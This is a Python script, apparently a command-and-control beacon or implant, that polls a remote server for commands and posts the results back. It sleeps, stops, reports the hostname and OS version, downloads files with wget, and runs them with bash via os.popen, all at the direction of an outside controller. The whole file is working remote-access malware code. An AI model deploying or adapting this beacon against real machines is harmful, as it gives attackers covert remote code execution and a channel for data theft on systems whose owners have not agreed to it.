import requests
import sys
from datetime import datetime
import os
import time

btoken = ""
baseurl = "http://localhost:8080"

def main(argv):
	global baseurl

	if len(argv) < 3 or len(argv) > 4:
		print("Usage: $ python3 beacon.py <id> <beacon token> <baseurl>")
	else:
		baseurl = argv[3]
		url = baseurl + "/beacon/command"

		btoken = argv[2]
		bid = argv[1]

		print(btoken)
		print(bid)

		data = {
			"beacon": {
				"id": bid, 
				"token": btoken,
			},
		}

		headers = {"Content-Type": "application/json; charset=utf-8"}
		response = requests.post(url, headers=headers, json=data)

		print(response.status_code)
		print(response.json())
		
		commands = response.json()
		executed = []

		recv_time = datetime.now()
		recv_time_str = recv_time.strftime("%d/%m/%Y %H:%M:%S")

		for com in commands:

			command_type = com["type"]
			content = com["content"]

			result = {}
			result["commandid"] = com["id"]

			if command_type == "SLEEP":
				time.sleep(int(content))
				result["content"] = "sleep success"
			elif command_type == "STOP":
				print("quitting")
				quit()
			elif command_type == "GETHOSTNAME":
				result["content"] = (os.popen("hostname").read())
			elif command_type == "GETHOSTOS":
				result["content"] = (os.popen("sw_vers -productVersion").read())
			elif command_type == "DOWNLOAD":
				result["content"] = (os.popen("wget " + content).read())
			elif command_type == "EXECUTE":
				result["content"] = (os.popen("bash " + content).read())
			
			exec_time = datetime.now()
			exec_time_str = recv_time.strftime("%Y-%m-%dT%H:%M:%S")
			result["exec_time"] = exec_time_str
			executed.append(result)

		print(executed)
		
		return_data = {
			"beacon": {
				"id": bid,
				"token": btoken,
			},
			"results": executed
		}

		return_url = baseurl + "/beacon/result"
		print(return_data)
		headers = {"Content-Type": "application/json; charset=utf-8"}
		response2 = requests.post(return_url, headers=headers, json=return_data)
		print(response2.status_code)
		print(response2.text)

if __name__ == "__main__":
    main(sys.argv)